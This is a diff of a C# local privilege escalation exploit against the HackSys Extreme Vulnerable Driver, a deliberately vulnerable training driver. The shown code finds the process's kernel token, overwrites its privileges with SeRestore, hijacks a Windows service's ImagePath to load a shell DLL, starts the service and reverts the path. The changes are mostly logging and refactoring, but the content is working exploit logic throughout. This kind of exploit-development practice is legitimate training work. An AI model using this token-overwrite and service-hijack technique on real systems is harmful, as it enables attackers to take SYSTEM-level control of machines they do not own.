@@ -958,7 +958,6 @@ namespace RestoreServiceModificationVariant
                 Console.WriteLine(
                     "Usage : {0} <path\\to\\HijackShellLib.dll>",
                     AppDomain.CurrentDomain.FriendlyName);
-
                 return;
             }
 
@@ -983,22 +982,27 @@ namespace RestoreServiceModificationVariant
             if (!Environment.Is64BitOperatingSystem)
             {
                 Console.WriteLine("[!] 32 bit OS is not supported.\n");
-
                 return;
             }
             else if (IntPtr.Size != 8)
             {
                 Console.WriteLine("[!] Should be built with 64 bit pointer.\n");
-
                 return;
             }
 
-            IntPtr tokenPointer = GetCurrentProcessTokenPointer();
+            Console.WriteLine("[*] Current account is \"{0}\\{1}\"", Environment.UserDomainName, Environment.UserName);
+            Console.WriteLine("[>] Trying to find token address for this process.");
 
-            if (tokenPointer == IntPtr.Zero)
+            IntPtr pCurrentToken = GetCurrentProcessTokenPointer();
+
+            if (pCurrentToken == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to find nt!_TOKEN.");
                 return;
+            }
+            else
+            {
+                Console.WriteLine("[+] nt!_TOKEN for this process @ 0x{0}", pCurrentToken.ToString("X16"));
             }
 
             string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
@@ -1008,13 +1012,12 @@ namespace RestoreServiceModificationVariant
             if (hDevice == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to open {0}", deviceName);
-
                 return;
             }
 
             var privs = (ulong)SepTokenPrivilegesFlags.RESTORE;
 
-            OverwriteTokenPrivileges(hDevice, tokenPointer, privs);
+            OverwriteTokenPrivileges(hDevice, pCurrentToken, privs);
             CloseHandle(hDevice);
 
             SERVICE_STATE state = CheckServiceState(serviceName);
@@ -1024,7 +1027,6 @@ namespace RestoreServiceModificationVariant
                 Console.WriteLine("[-] {0} service have not been stopped yet. Try again a few minutes later.", serviceName);
                 Console.WriteLine("    |-> Current State : {0}", state.ToString());
                 Console.WriteLine("[*] If you want to try this exploit soon, stop {0} with administrative privilege.\n", serviceName);
-
                 return;
             }
 
@@ -1066,13 +1068,9 @@ namespace RestoreServiceModificationVariant
             status = StartHijackedService(serviceName);
 
             if (status)
-            {
                 Console.WriteLine("[+] Exploit may be successful.");
-            }
             else
-            {
                 Console.WriteLine("[-] Exploit may be failed.");
-            }
 
             Console.WriteLine("[>] Reverting ImagePath for {0} service.", serviceName);
 
@@ -1086,13 +1084,9 @@ namespace RestoreServiceModificationVariant
             Marshal.FreeHGlobal(data);
 
             if (status)
-            {
                 Console.WriteLine("[+] ImagePath is reverted successfully.");
-            }
             else
-            {
                 Console.WriteLine("[-] Failed to revert ImagePath.");
-            }
 
             Console.WriteLine("[*] DONE.\n");
         }
